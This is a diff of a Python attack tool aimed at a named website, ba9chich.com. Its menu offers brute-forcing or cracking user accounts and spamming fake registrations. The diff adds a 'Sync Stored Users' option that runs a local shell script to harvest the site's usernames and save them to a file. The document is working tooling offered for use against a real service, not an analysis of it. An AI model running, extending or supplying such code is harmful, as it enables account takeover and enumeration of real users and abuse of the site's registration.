@@ -20,7 +20,7 @@ try:
     yellow=str(Fore.YELLOW)
     from random import randint
     wk=str(run("pwd", shell=True,capture_output=True, text=1).stdout).replace("\n","")
-
+    from os import system , path
 except Exception as E:
     print("error: "+str(E))
 
@@ -177,35 +177,78 @@ def spam_users():
     except KeyboardInterrupt:
         exit
 
+def syncUsers():
+    def check(url):
+        sleep(1)
+        print(f"{yellow}[*] Checking Server [\"{url}\"] Connectivity..")
+        if requests.get(url,headers={"Accept": "xml,*/*", "Accept-Language": "en-US,en", "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"}):
+            print(f"{green}[+] Server UP Working ")
+        else:
+            print(f"{red}[!] Server Down or URL changed ")
+            exit
+    
+    if path.exists("./sync.sh"):
+        try:
+            check("https://www.ba9chich.com/sitemap.xml")
+        except Exception as E:
+            print(E)
+        try:
+            print(f"{green}[*] Syncing Stored Users..")
+            content=str(run("bash sync.sh", shell=True,capture_output=True, text=1).stdout)
+            users=[]
+            for user in content.replace("\n"," ").split(" "):
+                users.append(str(user).strip("\n"))
+            while(1):
+                Choice=str(input("[*] Save Users ? (Y/N): "))
+                if Choice =="y" or Choice =="Y" or Choice =="yes" or Choice =="Yes" :
+                    try:
+                        with open("Synced_users.txt","a+") as f:
+                            for user in users[:len(users)-1]:
+                                f.write(str(user)+"\n")
+                        print(f"{green}[+] Saved at {wk}/Synced_users.txt")
+                        break
+                    except Exception as E:
+                        print("Error: "+str(E))
 
+                elif Choice =="n" or Choice =="N" or Choice =="no" or Choice =="No" :     
+                        print(users[:len(users)-1])
+                        break
+                else:
+                    continue
+
+        except Exception as E:
+            print(f"{red}Error: "+str(E))
+             
 
 def main():
-	exec=str(input(f"# Select (1/2) : \n\n\t{green}[1] Bruteforce/Crack Accounts \n\t{green}[2] Spam Fake Users registration\n{Style.RESET_ALL} > "))
-	try:
-		if int(exec) == 1:
-			bruteforce()
-		elif int(exec) == 2:
-			spam_users() 
-		else:
-		    main()
-	except KeyboardInterrupt:
-		exit
-	except:
-		main()
+    exec=str(input(f"# Select (1/2/3) : \n\n\t{green}[1] Bruteforce/Crack Accounts \n\t{green}[2] Spam Fake Users registration \n\t{green}[3] Sync Stored Users \n{Style.RESET_ALL}> "))
+    try:
+        if int(exec) == 1:
+            bruteforce()
+        elif int(exec) == 2:
+            spam_users()
+        elif int(exec) == 3:
+            syncUsers()  
+        else:
+            main()
+    except KeyboardInterrupt:
+        exit
+    except:
+        main()
 
 
 
 if __name__=="__main__":
-	try:
-		init(autoreset=True)
-		banner()
-		try:
-			while(1):
-				main()
-				print("")
-		except KeyboardInterrupt:
-			exit
-		except Exception as E:
-			print(f"{red}Error: "+str(E))
-	except KeyboardInterrupt:
-		exit
+    try:
+        init(autoreset=True)
+        banner()
+        try:
+            while(1):
+                main()
+                print("")
+        except KeyboardInterrupt:
+            exit
+        except Exception as E:
+            print(f"{red}Error: "+str(E))
+    except KeyboardInterrupt:
+        exit
